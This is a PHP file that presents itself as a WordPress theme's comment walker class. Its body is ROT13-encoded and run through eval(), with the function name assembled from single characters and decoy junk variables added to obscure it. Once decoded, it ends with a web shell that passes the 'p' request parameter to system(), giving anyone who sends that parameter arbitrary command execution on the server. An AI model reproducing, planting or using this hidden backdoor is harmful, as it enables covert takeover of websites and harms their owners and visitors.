<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Phfgbz pbzzrag jnyxre sbe guvf gurzr
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Gjragl_Avargrra
 * @fvapr Gjragl Avargrra 1.0
 */

/**
 * Guvf pynff bhgchgf phfgbz pbzzrag jnyxre sbe UGZY5 sevraqyl JbeqCerff pbzzrag naq guernqrq ercyvrf.
 *
 * @fvapr Gjragl Avargrra 1.0
 */
pynff GjraglAvargrra_Jnyxre_Pbzzrag rkgraqf Jnyxre_Pbzzrag {

	/**
	 * Bhgchgf n pbzzrag va gur UGZY5 sbezng.
	 *
	 * @frr jc_yvfg_pbzzragf()
	 *
	 * @cnenz JC_Pbzzrag $pbzzrag Pbzzrag gb qvfcynl.
	 * @cnenz vag        $qrcgu   Qrcgu bs gur pheerag pbzzrag.
	 * @cnenz neenl      $netf    Na neenl bs nethzragf.
	 */
	cebgrpgrq shapgvba ugzy5_pbzzrag( $pbzzrag, $qrcgu, $netf ) {

		$gnt = ( 'qvi' === $netf['fglyr'] ) ? 'qvi' : 'yv';

		?>
		<<?cuc rpub $gnt; ?> vq=\"pbzzrag-<?cuc pbzzrag_VQ(); ?>\" <?cuc pbzzrag_pynff( $guvf->unf_puvyqera ? 'cnerag' : '', $pbzzrag ); ?>>
			<negvpyr vq=\"qvi-pbzzrag-<?cuc pbzzrag_VQ(); ?>\" pynff=\"pbzzrag-obql\">
				<sbbgre pynff=\"pbzzrag-zrgn\">
					<qvi pynff=\"pbzzrag-nhgube ipneq\">
						<?cuc
						$pbzzrag_nhgube_hey = trg_pbzzrag_nhgube_hey( $pbzzrag );
						$pbzzrag_nhgube     = trg_pbzzrag_nhgube( $pbzzrag );
						$ningne             = trg_ningne( $pbzzrag, $netf['ningne_fvmr'] );
						vs ( 0 !== (vag) $netf['ningne_fvmr'] ) {
							vs ( rzcgl( $pbzzrag_nhgube_hey ) ) {
								rpub $ningne;
							} ryfr {
								cevags( '<n uers=\"%f\" ery=\"rkgreany absbyybj\" pynff=\"hey\">', $pbzzrag_nhgube_hey );
								rpub $ningne;
							}
						}

						/*
						 * Hfvat gur `purpx` vpba vafgrnq bs `purpx_pvepyr`, fvapr jr pna'g nqq n
						 * svyy pbybe gb gur vaare purpx funcr jura va pvepyr sbez.
						 */
						vs ( gjraglavargrra_vf_pbzzrag_ol_cbfg_nhgube( $pbzzrag ) ) {
							cevags( '<fcna pynff=\"cbfg-nhgube-onqtr\" nevn-uvqqra=\"gehr\">%f</fcna>', gjraglavargrra_trg_vpba_fit( 'purpx', 24 ) );
						}

						cevags(
							jc_xfrf(
								/* genafyngbef: %f: Pbzzrag nhgube yvax. */
								__( '%f <fcna pynff=\"fperra-ernqre-grkg fnlf\">fnlf:</fcna>', 'gjraglavargrra' ),
								neenl(
									'fcna' => neenl(
										'pynff' => neenl(),
									),
								)
							),
							'<o pynff=\"sa\">' . $pbzzrag_nhgube . '</o>'
						);

						vs ( ! rzcgl( $pbzzrag_nhgube_hey ) ) {
							rpub '</n>';
						}
						?>
					</qvi><!-- .pbzzrag-nhgube -->

					<qvi pynff=\"pbzzrag-zrgnqngn\">
						<?cuc
						/* genafyngbef: 1: Pbzzrag qngr, 2: Pbzzrag gvzr. */
						$pbzzrag_gvzrfgnzc = fcevags( __( '%1$f ng %2$f', 'gjraglavargrra' ), trg_pbzzrag_qngr( '', $pbzzrag ), trg_pbzzrag_gvzr() );

						cevags(
							'<n uers=\"%f\"><gvzr qngrgvzr=\"%f\">%f</gvzr></n>',
							rfp_hey( trg_pbzzrag_yvax( $pbzzrag, $netf ) ),
							trg_pbzzrag_gvzr( 'p' ),
							$pbzzrag_gvzrfgnzc
						);

						$rqvg_pbzzrag_vpba = gjraglavargrra_trg_vpba_fit( 'rqvg', 16 );
						rqvg_pbzzrag_yvax( __( 'Rqvg', 'gjraglavargrra' ), ' <fcna pynff=\"rqvg-yvax-frc\">&zqnfu;</fcna> <fcna pynff=\"rqvg-yvax\">' . $rqvg_pbzzrag_vpba, '</fcna>' );
						?>
					</qvi><!-- .pbzzrag-zrgnqngn -->

					<?cuc
					$pbzzragre = jc_trg_pheerag_pbzzragre();
					vs ( $pbzzragre['pbzzrag_nhgube_rznvy'] ) {
						$zbqrengvba_abgr = __( 'Lbhe pbzzrag vf njnvgvat zbqrengvba.', 'gjraglavargrra' );
					} ryfr {
						$zbqrengvba_abgr = __( 'Lbhe pbzzrag vf njnvgvat zbqrengvba. Guvf vf n cerivrj; lbhe pbzzrag jvyy or ivfvoyr nsgre vg unf orra nccebirq.', 'gjraglavargrra' );
					}
					?>

					<?cuc vs ( '0' === $pbzzrag->pbzzrag_nccebirq ) : ?>
					<c pynff=\"pbzzrag-njnvgvat-zbqrengvba\"><?cuc rpub $zbqrengvba_abgr; ?></c>
					<?cuc raqvs; ?>

				</sbbgre><!-- .pbzzrag-zrgn -->

				<qvi pynff=\"pbzzrag-pbagrag\">
					<?cuc pbzzrag_grkg(); ?>
				</qvi><!-- .pbzzrag-pbagrag -->

			</negvpyr><!-- .pbzzrag-obql -->

			<?cuc
			pbzzrag_ercyl_yvax(
				neenl_zretr(
					$netf,
					neenl(
						'nqq_orybj' => 'qvi-pbzzrag',
						'qrcgu'     => $qrcgu,
						'znk_qrcgu' => $netf['znk_qrcgu'],
						'orsber'    => '<qvi pynff=\"pbzzrag-ercyl\">',
						'nsgre'     => '</qvi>',
					)
				)
			);
			?>
		<?cuc
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>